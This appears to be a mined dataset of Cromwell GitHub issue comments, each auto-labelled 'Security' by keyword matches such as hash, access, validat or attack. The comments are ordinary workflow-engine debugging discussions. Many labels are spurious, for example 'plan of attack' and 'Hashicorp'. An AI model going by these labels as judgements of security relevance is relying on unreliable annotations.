Security,"How about if we just drop the structure and flattened all the messages:; ```; ""failures"": [{; ""message"": ""connect timed out""; ""message"": ""Failed to upload authentication file""; ""message"": ""Error getting access token for service account: ""; }]; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282801717:155,authenticat,authentication,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2037#issuecomment-282801717,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"How would the validation know what backend the task is going to be run on and if that backend requires docker?. Which is not to say that it can't happen sooner, but I don't think it can work like you're picturing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2932#issuecomment-346460834:14,validat,validation,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2932#issuecomment-346460834,1,['validat'],['validation']
Security,"However it'd be lovely to have defense in depth in case they ever changed something :). Also, if we want to expose the API directly to the outside world (which is likely sooner than later)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958825:108,expose,expose,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456958825,1,['expose'],['expose']
Security,I agree that metrics on checksum failures would be nice but that does seem to be beyond the scope of the ticket as currently written; perhaps a follow-on ticket?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6683#issuecomment-1051019488:24,checksum,checksum,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6683#issuecomment-1051019488,1,['checksum'],['checksum']
Security,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:588,Access,AccessDenied,588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185,2,['Access'],"['Access', 'AccessDenied']"
Security,"I also played around with bolting on the docker hashing too. To be clear, I like @mcovarr's PR here better, as it's much cleaner, and has tests! Still, here's some overlapping [code](https://github.com/broadinstitute/cromwell/compare/job_avoidance...ks_hash_docker_image) to look at, especially the first commit with an alternative way to get an `ActorSystem` down into the `BackendCall`. A few issues left though, but some/most of these can be logged as new tickets, and we can get basic wiring in for the moment via this PR. Biggest issue-- 10 seconds is right on the edge for testing _and_ checking the docker server for the hash, so different docker tests currently timeout intermittently. Among other issues I saw, `Future` exception handling may be different due to refactoring. For example converting `Future { /* big block */ }` to `/* big block */ hashFuture.map(hash => ...)` allows exceptions within the block to not get caught (as expected?). Also I wasn't sure yet how we want to handle some `Failure` cases, specifically when the docker server doesn't return a hash. I assume that means that we should just run again from scratch, and NOT go to a `FailedExecution` state in the database. Or maybe we should go to `Failure`, and just retry a particular operations later. With ~~Gatling~~ Tyburn load testing, perhaps we can log any docker client errors now, and start to distinguish them with custom error handling code as they pop up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702:48,hash,hashing,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164760702,10,['hash'],"['hash', 'hashFuture', 'hashing']"
Security,"I also tried Firefox Quantum 65.0.1, with all extensions disabled. (Also tried with the latest Shockwave Flash, just in case.) Same result. I also tried IE9 with basically no plug-ins, and I cannot even login there. The ""Sign In"" button does nothing. Are you sure that my account gives me access to ask questions?. Any other ideas?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4625#issuecomment-465215552:289,access,access,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4625#issuecomment-465215552,1,['access'],['access']
Security,"I am also having this issue. . I don't understand what I am going wrong because it seems to be I am following the basic use case explained in the cromwell manual. I have basicaly took the published paired-fastq-to-unmapped-bam.wdl. can have added inputs and parsing to that each umapped bam file created get processed first by ; processing-for-variant-discovery-local-gatk4.wdl; and then the processed bam file gets processed by ; haplotypecaller-gvcf-gatk4.wdl. So I import the 2 workflows on the top. ```; import ""processing-for-variant-discovery-local-gatk4.wdl"" as process_bam; import ""haplotypecaller-gvcf-gatk4_no_docker.wdl"" as haplotype_caller; ```. and then use them on the ubam outputs. When I run it through validate I get the same error. ```; java -jar ~/src/cromwell-36/womtool-36.jar validate my_pipeline.wdl. ERROR: Missing value or call: Couldn't find value or call with name 'haplotype_caller' in workflow (line 131):. Array[File] HaplotypeCalls_output_vcfs = haplotype_caller.HaplotypeCallerGvcf_GATK4.output_vcf; ^. java -jar ~/src/cromwell-36/womtool-36.jar validate my_pipeline.wdl. ERROR: Missing value or call: Couldn't find value or call with name 'haplotype_caller' in workflow (line 131):. Array[File] HaplotypeCalls_output_vcfs = haplotype_caller.output_vcf; ^; ```. I thought it might be that 2 subworkflows was not supported so I took out the last one and the error become about the first:. ```; java -jar ~/src/cromwell-36/womtool-36.jar validate my_pipeline_no_variant_calling.wdl. ERROR: Missing value or call: Couldn't find value or call with name 'sub' in workflow (line 110):. Array[File] ProcessedBams_duplication_metrics = sub.duplication_metrics; ^; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2756#issuecomment-435006736:719,validat,validate,719,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2756#issuecomment-435006736,4,['validat'],['validate']
Security,I am curious ... how do I look into my Stackdriver Audit logs?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685289891:51,Audit,Audit,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685289891,1,['Audit'],['Audit']
Security,I am currently using Hashicorp Nomad for some other applications. I am interested in using Nomad to run Cromwell jobs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6001#issuecomment-1079171605:21,Hash,Hashicorp,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6001#issuecomment-1079171605,1,['Hash'],['Hashicorp']
Security,"I am experiencing a similar issue. Due to private AWS ECR registries not being supported, the hash lookup would not work with the remote hash lookup which was causing call-caching to not work. To bypass this, I installed a Docker CLI on the Cromwell server and enabled the local lookup, but this library/ prefix kept being added. I was able to patch it by modifying `dockerHashing/src/main/scala/cromwell/docker/local/DockerCliFlow.scala`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450:94,hash,hash,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6172#issuecomment-782111450,2,['hash'],['hash']
Security,"I am having the same error with the example ""Using Data on S3"" on https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-examples/ . I have changed the S3 bucket name in the .json file to my bucket name, but the run still failed. After reporting running failure, I have got the same error message. I am using cromwell-48. The S3 bucket has all public access, and I was logged in as the Admin in two terminal windows, one running the server and the other submitting the job. The previous two hello-world example were successful. There is no log file in the bucket and in the cromwell-execution, the only file create was the script. There is no rc or stderr or stdout created.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-597868610:373,access,access,373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4687#issuecomment-597868610,1,['access'],['access']
Security,"I am running into the same bug on Terra. Not sure what version of Cromwell it is using. My wdl validates however, I get the a run time error. ```; Failed to evaluate input 'fastq1' (reason 1 of 1): No coercion defined from wom value(s) '""gs://fc-secure-46b3886a-473a-49ef-8073-022230a526ac/6463b025-27cf-4649-b6d0-59f860bdf18b/bam2FastQStarAlignWorkflow/a4a0d2f2-cc8b-41d8-a5b5-61cf6c2d0bd4/call-bamToFastq/cacheCopy/GTEX-1192X-0011-R10a-SM-DO941.1.fastq.gz""' of type 'File' to 'Array[File]'.; ```. adding '[' and ']' resolved the run time issue; ```; call starWorkflow.star_fastq_list {; input:; star_index = starIndex,; fastq1 = [ bamToFastq.firstEndFastq ],; fastq2 = [ bamToFastq.secondEndFastq ],; prefix = sampleId; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-1148945607:95,validat,validates,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4550#issuecomment-1148945607,2,"['secur', 'validat']","['secure-', 'validates']"
Security,I assume it would be nice to have the hash of the Docker image Cromwell thinks your call ran with (pretending there are no race condition or other consistency issues between what Cromwell is doing to validate hashes and what's seen in JES)?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164547063:38,hash,hash,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322#issuecomment-164547063,3,"['hash', 'validat']","['hash', 'hashes', 'validate']"
Security,"I beleive that I have worked out the reason for this.; I'm using the ""path"" hashing strategy, and at out org there is an ongoing data move that is leaving symlinks behind, so all my paths in my reference file are still correct, but the real path has changed. Changing the hashing strategy to file has worked in at least one test case, and I'm trying a larger test now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5370#issuecomment-575730947:76,hash,hashing,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5370#issuecomment-575730947,2,['hash'],['hashing']
Security,"I believe it does now cover it since you can see the difference in hash per input and trace that back to a change in the contents of a file (however you might not be able to tell difference between different file path to same input vs same file path with different file contents, but you can tell it's a different file path from the inputs that were used, so I believe you have enough info to make this call). Unless @helgridly can think of something this isn't covering",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-332236660:67,hash,hash,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-332236660,1,['hash'],['hash']
Security,"I believe that in Life Sciences and its predecessors, pull access to private GCR images was granted by the credentials on the job VM. Since Batch is a much larger step change, it could be that this behavior no longer holds true. @Lipastomies what steps do you take to configure your system to use those private images?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417:59,access,access,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356#issuecomment-2130262417,1,['access'],['access']
Security,I believe the related google doc is [Slick Heartburn](https://docs.google.com/document/d/11CHJzI-rQJWJ2XZWjPo1WUr8CiqCYn_vv_a5Raprw9U/edit).; @geoffjentry have we chosen a plan of attack yet?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-332211258:180,attack,attack,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-332211258,1,['attack'],['attack']
Security,"I believe this was only used for hashes, which are no longer part of Cromwells v21+",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1251#issuecomment-253931720:33,hash,hashes,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1251#issuecomment-253931720,1,['hash'],['hashes']
Security,"I believe to do this properly, it's the specific backend that should grab the docker image hash when a task is actually run (as opposed to the engine which can evaluate it when it sends it to the backend... which could queue it for any length of time). When checking for a call cache hit... we should first check everything else that's cheap before getting this hash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-259272505:91,hash,hash,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617#issuecomment-259272505,2,['hash'],['hash']
Security,"I believe we want to patch this off of the cromwell hash we are currently; using - 3eb1623; https://github.com/broadinstitute/cromwell/commit/3eb1623d9a5ffdf0fc3626820eab84ae6560b2cd. On Fri, Mar 18, 2016 at 12:01 PM, mcovarr notifications@github.com wrote:. > Sounds good; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198426842",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198459262:52,hash,hash,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198459262,1,['hash'],['hash']
Security,I came here to say what I apparently said a few months ago already :). We don't have access to a SLURM cluster so anything we put together would be a guess on our part. I know folks have been able to pretty easily get LSF & PBS working based on our example of an SGE configuration so my assumption is that it's not hard but I have no way of knowing. If someone were to get it working and submit docs we'd happily accept them but we have no way of handling that ourselves.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-281771190:85,access,access,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-281771190,1,['access'],['access']
Security,"I can access it now. It's really gross to have to sign into a private jira in order to see bug reports from an open source project though. If we have to use JIRA for some reason, is there a way to at least make it publicly visible without a login?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502154980:6,access,access,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-502154980,1,['access'],['access']
Security,I can add a test.; I'm all for making PRs to CWL conformance tests but it's going to increase the merge time of our PRs if we want to wait for it to be in the CWL repo. Also we'd need to unpin the hash for conformance test or update it every time..,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374939225:197,hash,hash,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3438#issuecomment-374939225,1,['hash'],['hash']
Security,"I can't reproduce this error with hash 437d1b592ca606cdd96276a1cf85bf84594c31eb on develop, though I do still see the TMPDIR bug. I'll work on fixing that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3743#issuecomment-395613110:34,hash,hash,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3743#issuecomment-395613110,1,['hash'],['hash']
Security,"I can't think of any runtime parameters (with the exception of `docker`); that should change the hashing. Also, are the inputs to the task hashed or; is it the fully rendered command block or what? Because if I have a; parameter to the task (such as ""preemptible_attempts"") that is only used in; the runtime block, (ideally) I'd like it to be ignored for call caching; purposes. On Fri, Sep 8, 2017 at 3:12 PM, Kate Voss <notifications@github.com> wrote:. > As a *workflow runner*, I want *certain parameters to be ignored in the; > hashing process*, so that I can *call cache on more workflows when the; > result is exactly the same*.; >; > - Effort: *?*; > - Risk: *Medium*; > - We should err on the side of hashing a workflow differently if we; > are not absolutely confident that the parameter does not impact the result.; > - Which parameters are ignored is NOT user-editable. This is to; > prevent users from accidentally ignoring parameters that do impact the; > result.; > - Business value: *Medium*; >; > Some parameters, such as preemptible_attempts and CPU, don't affect the; > outcome of the workflow but workflows with different CPU values will not; > call cache.; >; > @LeeTL1220 <https://github.com/leetl1220> and @geoffjentry; > <https://github.com/geoffjentry> to provide additional thoughts and; > context if helpful.; > Related issue #1210; > <https://github.com/broadinstitute/cromwell/issues/1210>; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2604>, or mute the; > thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk24fM_SrXs0gx-Ry1aw1opHFZAb5ks5sgZG5gaJpZM4PRlLU>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717:97,hash,hashing,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717,4,['hash'],"['hashed', 'hashing']"
Security,"I did another run last night, and I have found a few entries like this including `iam.serviceAccounts.*` permissions:; ```; insertId: 1mk6qq6ej6zkd; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: giulio@broadinstitute.org; principalSubject: user:giulio@broadinstitute.org; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; page_size: 100; requestMetadata:; callerIp: 64.112.179.105; callerSuppliedUserAgent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101; Firefox/80.0,gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T03:28:37.843325531Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T03:28:38.742413691Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T03:28:37.734190692Z'; ```. Sometimes like this instead:; ```; insertId: 1mk6qq6ek68fs; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: google@broadinstitute.com; principalSubject: user:google@broadinstitute.com; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; r",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080:286,audit,audit,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080,4,"['Audit', 'audit', 'authenticat', 'authoriz']","['AuditLog', 'audit', 'authenticationInfo', 'authorizationInfo']"
Security,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:347,hash,hashing,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274,1,['hash'],['hashing']
Security,"I did some cleanup on this yesterday. Things I was planning to do and didn't have time for due to prod incident:; * Check all language to be sure it's really clear when we're dealing with WSM auth tokens and when we're dealing with blob SAS tokens.; * Either a lot more comments throughout or one large comment with pointers throughout, to clarify the different paths we could take to blob access and when they're useful, what they mean.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6954#issuecomment-1332204180:390,access,access,390,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6954#issuecomment-1332204180,2,['access'],['access']
Security,"I don't have access to broad jira so I'm wondering if there is any progress on this bug? @rsasch . We get into the same trouble here. We run our WDL on AWS with batch backend. To share a little more info in addition to what people already see, I saw in the `DELOCALIZING OUTPUTS` section ""reconfigured-script.sh"" I noticed it failed to delocalize files in `Array[File]` in our struct just like what others see. It seems those files are skipped and not ""scanned"" just like @hkeward pointed out above.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5592#issuecomment-1442197318:13,access,access,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5592#issuecomment-1442197318,1,['access'],['access']
Security,"I don't quite understand why this has failed, github actions suggests that this build was working before and my change caused it to crash. FWIW, I find the travis test logs extremely hard to navigate. . I tried to download the log locally and with a couple of greps found this: . ```; - should successfully run hello_google_legacy_machine_selection *** FAILED *** (6 minutes, 33 seconds); centaur.test.CentaurTestException: Invalid metadata response:; -Missing key: calls.wf_hello.hello.jes.machineType; at centaur.test.CentaurTestException$.apply(CentaurTestException.scala:34); at centaur.test.Operations$$anon$28.checkDiff$1(Test.scala:737); at centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$8(Test.scala:779); at map @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$6(Test.scala:777); at flatMap @ centaur.test.Operations$$anon$28.$anonfun$validateMetadata$5(Test.scala:776); at unsafeToFuture @ centaur.api.CentaurCromwellClient$.$anonfun$retryRequest$3(CentaurCromwellClient.scala:151); at timeout @ cromwell.api.model.package$EnhancedFailureResponseOrT$.timeout$extension(package.scala:61); at fromFuture @ cromwell.api.model.package$EnhancedFutureHttpResponse$.asFailureResponseOrT$extension(package.scala:38); ...; ```. Any help would be appreciated :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690:690,validat,validateMetadata,690,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-749303690,5,['validat'],['validateMetadata']
Security,"I don't see any error logging associated with this cromwell hash. However, I did see this:. ```; 2016-05-03 10:14:45,314 cromwell-system-akka.actor.default-dispatcher-17 ERROR - BackendCallExecutionActor [UUID(643d3c46):CollectUnsortedReadgroupBamQualityMetrics:22]: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1056) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; at cromwell.e",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:60,hash,hash,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['hash'],['hash']
Security,"I don't think it implies the header and body will **both** have the same hash for any given request. It sounds more like it will either be in the header or the body, hence they check one and then the other. Can you point me to a docker registry that doesn't follow this rule?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-487764851:73,hash,hash,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4864#issuecomment-487764851,1,['hash'],['hash']
Security,"I exposed this as `monitoring_image` workflow option, and included the Dockerfile & script in `supportedBackends/google/pipelines/v2alpha1/src/main/resources/cromwell-monitor/`. Should we also add a CI script that builds the image?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451601217:2,expose,exposed,2,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510#issuecomment-451601217,1,['expose'],['exposed']
Security,"I feel uneasy recommending an unencrypted connection to a database, especially when the MySQL team went out of their way to start warning about this issue. That said, the simplest copypasta you can use to remove that warning is to pass the specified parameter in your database url:. In this stanza, change the url from:. ```; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://host/cromwell""; user = ""user""; password = ""pass""; connectionTimeout = 5000; }; ```. To:. ```; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://host/cromwell?useSSL=false""; user = ""user""; password = ""pass""; connectionTimeout = 5000; }; ```. Or if there are already other params already on your url, append using ""&"" instead of ""?"":. ```; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://host/cromwell?other=param&useSSL=false""; user = ""user""; password = ""pass""; connectionTimeout = 5000; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254523992:417,password,password,417,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1591#issuecomment-254523992,6,['password'],['password']
Security,"I finally figured out that the problem has to do with special characters in a password. If I use an all-alpha password, everything works fine. If I use a password with shell metacharacters like `$`, `!` or `*` then the Docker login seems to silently fail and consequently the private image pull fails as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655:78,password,password,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2329325655,3,['password'],['password']
Security,"I find 18 occurrences. `./backend/src/main/scala/cromwell/backend/ExecutionHash.scala: // TODO: PBE: ideally hashes should be deterministic; ./backend/src/test/scala/cromwell/backend/caching/CachingConfigSpec.scala:// TODO PBE Adapt to how new caching works, but the test logic should not need much change; ./database/src/test/scala/cromwell/database/slick/SlickDatabaseSpec.scala: // TODO PBE get rid of this after the migration of #789 has run.; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala: // TODO PBE Is this the right place for startTime ?; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowActor.scala: // TODO: PBE: some of the x-es have an actually execution & output stores.; ./engine/src/main/scala/cromwell/engine/workflow/WorkflowManagerActor.scala: // TODO PBE Restart: to be verified after restart is implemented but these WorkflowSucceededResponse/WorkflowFailedResponse seem useless; ./engine/src/main/scala/cromwell/webservice/CromwellApiService.scala: // TODO: PBE: Certainly want to do something for this! But probably not to the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; 